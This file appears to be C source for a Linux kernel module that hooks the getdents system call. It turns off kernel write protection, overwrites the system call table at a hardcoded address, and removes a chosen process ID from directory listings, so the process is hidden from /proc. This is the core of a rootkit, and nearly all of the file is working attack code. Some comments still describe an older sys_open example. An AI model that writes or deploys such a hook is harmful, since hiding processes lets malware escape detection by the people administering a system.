#include <linux/kernel.h>	/* We're doing kernel work */
#include <linux/module.h>	/* Specifically, a module, */
#include <linux/moduleparam.h>	/* which will have params */
#include <linux/unistd.h>	/* The list of system calls */
#include <linux/fs.h>
#include <linux/string.h>
#define CR0_WP 0x00010000 /* Kernel WriteProtect bit */
#include <linux/sched.h>
#include <linux/string.h>
#include <asm/uaccess.h>

struct linux_dirent {
		unsigned long   d_ino;
		unsigned long   d_off;
		unsigned short  d_reclen;
		char	    d_name[1];
};

/* 
 * The system call table (a table of functions). We
 * just define this as external, and the kernel will
 * fill it up for us when we are insmod'ed
 *
 * sys_call_table is no longer exported in 2.6.x kernels.
 * If you really want to try this DANGEROUS module you will
 * have to apply the supplied patch against your current kernel
 * and recompile it.
 */
/* extern void *sys_call_table[]; */
static void **sys_call_table = (void **)0xffffffff81801440;  

/* 
 * A pointer to the original system call. The reason
 * we keep this, rather than call the original function
 * (sys_open), is because somebody else might have
 * replaced the system call before us. Note that this
 * is not 100% safe, because if another module
 * replaced sys_open before us, then when we're inserted
 * we'll call the function in that module - and it
 * might be removed before we are.
 *
 * Another reason for this is that we can't get sys_open.
 * It's a static variable, so it is not exported. 
 */
asmlinkage int (*original_call) 
(unsigned int, struct linux_dirent *, unsigned int);

static char target_proc_id[100]; 

/* 
 * The function we'll replace sys_open (the function
 * called when you call the open system call) with. To
 * find the exact prototype, with the number and type
 * of arguments, we find the original function first
 * (it's at fs/open.c).
 *
 * In theory, this means that we're tied to the
 * current version of the kernel. In practice, the
 * system calls almost never change (it would wreck havoc
 * and require programs to be recompiled, since the system
 * calls are the interface between the kernel and the
 * processes).
 */
asmlinkage int our_sys_getdents(unsigned int fd,
	struct linux_dirent __user *dirp, unsigned int count)
{
	long value;
	/* struct inode *dinode; */
	unsigned short len = 0;
	unsigned short tlen = 0;
	/* struct linux_dirent *mydir = NULL; */
	value = (*original_call) (fd, dirp, count);
	tlen = value;
	while(tlen > 0)
	{
		len = dirp->d_reclen;
		tlen = tlen - len;
		printk(KERN_INFO "d_name = %s\n",dirp->d_name);
							   
		if (strcmp(dirp->d_name, target_proc_id) == 0)
		{
			printk("find process\n");
			memmove(dirp, (char *) dirp + dirp->d_reclen, tlen);
			value = value - len;
			printk(KERN_INFO "hide successful.\n");
		}
		else { 
			if(tlen)
			dirp = (struct linux_dirent *) ((char *)dirp +
							dirp->d_reclen);
		}
	}
	printk(KERN_INFO "finished hacked_getdents.\n");
	return value;
}

/* 
 * Initialize the module - replace the system call 
 */
int hijack_syscall(struct task_struct *task)
{
	unsigned long cr0;
	sprintf(target_proc_id, "%d", task->pid); 
	original_call = sys_call_table[__NR_getdents];
	cr0 = read_cr0(); 
	write_cr0(cr0 & ~CR0_WP);

	sys_call_table[__NR_getdents] = our_sys_getdents;

	write_cr0(cr0); /* restore */
	return 0;
}

/* 
 * Cleanup - unregister the appropriate file from /proc 
 */
void unhijack_syscall(void)
{
	unsigned long cr0; 
	cr0 = read_cr0(); 
	write_cr0(cr0 & ~CR0_WP); 

	sys_call_table[__NR_getdents] = original_call;
	
	write_cr0(cr0);
}
 
